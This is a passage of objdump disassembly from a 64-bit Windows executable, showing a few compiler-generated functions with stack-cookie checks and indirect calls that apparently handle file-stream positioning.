   140005292:	5e                   	pop    %rsi
   140005293:	5b                   	pop    %rbx
   140005294:	c3                   	ret
   140005295:	cc                   	int3
   140005296:	cc                   	int3
   140005297:	cc                   	int3
   140005298:	cc                   	int3
   140005299:	cc                   	int3
   14000529a:	cc                   	int3
   14000529b:	cc                   	int3
   14000529c:	cc                   	int3
   14000529d:	cc                   	int3
   14000529e:	cc                   	int3
   14000529f:	cc                   	int3
   1400052a0:	40 53                	rex push %rbx
   1400052a2:	56                   	push   %rsi
   1400052a3:	57                   	push   %rdi
   1400052a4:	48 83 ec 30          	sub    $0x30,%rsp
   1400052a8:	48 8b 05 91 8d 00 00 	mov    0x8d91(%rip),%rax        # 0x14000e040
   1400052af:	48 33 c4             	xor    %rsp,%rax
   1400052b2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400052b7:	49 8b 40 08          	mov    0x8(%r8),%rax
   1400052bb:	49 8b f0             	mov    %r8,%rsi
   1400052be:	49 03 00             	add    (%r8),%rax
   1400052c1:	48 8b da             	mov    %rdx,%rbx
   1400052c4:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400052cb:	00 
   1400052cc:	48 8b f9             	mov    %rcx,%rdi
   1400052cf:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400052d4:	74 70                	je     0x140005346
   1400052d6:	e8 a5 0f 00 00       	call   0x140006280
   1400052db:	84 c0                	test   %al,%al
   1400052dd:	74 67                	je     0x140005346
   1400052df:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   1400052e6:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400052eb:	ff 15 67 42 00 00    	call   *0x4267(%rip)        # 0x140009558
   1400052f1:	85 c0                	test   %eax,%eax
   1400052f3:	75 51                	jne    0x140005346
   1400052f5:	48 8b 46 10          	mov    0x10(%rsi),%rax
   1400052f9:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1400052fd:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140005301:	48 8d 47 70          	lea    0x70(%rdi),%rax
   140005305:	48 39 01             	cmp    %rax,(%rcx)
   140005308:	75 22                	jne    0x14000532c
   14000530a:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   140005311:	4c 8b 87 90 00 00 00 	mov    0x90(%rdi),%r8
   140005318:	48 89 11             	mov    %rdx,(%rcx)
   14000531b:	44 2b c2             	sub    %edx,%r8d
   14000531e:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140005322:	48 89 11             	mov    %rdx,(%rcx)
   140005325:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   140005329:	44 89 01             	mov    %r8d,(%rcx)
   14000532c:	48 8b 57 74          	mov    0x74(%rdi),%rdx
   140005330:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140005335:	48 89 0b             	mov    %rcx,(%rbx)
   140005338:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   14000533c:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140005343:	00 
   140005344:	eb 15                	jmp    0x14000535b
   140005346:	33 c0                	xor    %eax,%eax
   140005348:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   14000534f:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140005356:	00 
   140005357:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000535b:	48 8b c3             	mov    %rbx,%rax
   14000535e:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140005363:	48 33 cc             	xor    %rsp,%rcx
   140005366:	e8 95 19 00 00       	call   0x140006d00
   14000536b:	48 83 c4 30          	add    $0x30,%rsp
   14000536f:	5f                   	pop    %rdi
   140005370:	5e                   	pop    %rsi
   140005371:	5b                   	pop    %rbx
   140005372:	c3                   	ret
   140005373:	cc                   	int3
   140005374:	cc                   	int3
   140005375:	cc                   	int3
   140005376:	cc                   	int3
   140005377:	cc                   	int3
   140005378:	cc                   	int3
   140005379:	cc                   	int3
   14000537a:	cc                   	int3
   14000537b:	cc                   	int3
   14000537c:	cc                   	int3
   14000537d:	cc                   	int3
   14000537e:	cc                   	int3
   14000537f:	cc                   	int3
   140005380:	40 53                	rex push %rbx
   140005382:	55                   	push   %rbp
   140005383:	56                   	push   %rsi
   140005384:	57                   	push   %rdi
   140005385:	41 56                	push   %r14
   140005387:	48 83 ec 30          	sub    $0x30,%rsp
   14000538b:	48 8b 05 ae 8c 00 00 	mov    0x8cae(%rip),%rax        # 0x14000e040
   140005392:	48 33 c4             	xor    %rsp,%rax
   140005395:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000539a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000539e:	4c 8d 71 70          	lea    0x70(%rcx),%r14
   1400053a2:	41 8b e9             	mov    %r9d,%ebp
   1400053a5:	49 8b f0             	mov    %r8,%rsi
   1400053a8:	48 8b fa             	mov    %rdx,%rdi
   1400053ab:	48 8b d9             	mov    %rcx,%rbx
   1400053ae:	4c 39 30             	cmp    %r14,(%rax)
   1400053b1:	75 10                	jne    0x1400053c3
   1400053b3:	41 83 f9 01          	cmp    $0x1,%r9d
   1400053b7:	75 0a                	jne    0x1400053c3
   1400053b9:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   1400053be:	75 03                	jne    0x1400053c3
   1400053c0:	48 ff ce             	dec    %rsi
   1400053c3:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400053ca:	00 
   1400053cb:	0f 84 85 00 00 00    	je     0x140005456
   1400053d1:	e8 aa 0e 00 00       	call   0x140006280
   1400053d6:	84 c0                	test   %al,%al
   1400053d8:	74 7c                	je     0x140005456
   1400053da:	48 85 f6             	test   %rsi,%rsi
   1400053dd:	75 05                	jne    0x1400053e4
   1400053df:	83 fd 01             	cmp    $0x1,%ebp
   1400053e2:	74 17                	je     0x1400053fb
   1400053e4:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   1400053eb:	44 8b c5             	mov    %ebp,%r8d
   1400053ee:	48 8b d6             	mov    %rsi,%rdx
   1400053f1:	ff 15 c9 41 00 00    	call   *0x41c9(%rip)        # 0x1400095c0
   1400053f7:	85 c0                	test   %eax,%eax
   1400053f9:	75 5b                	jne    0x140005456
   1400053fb:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
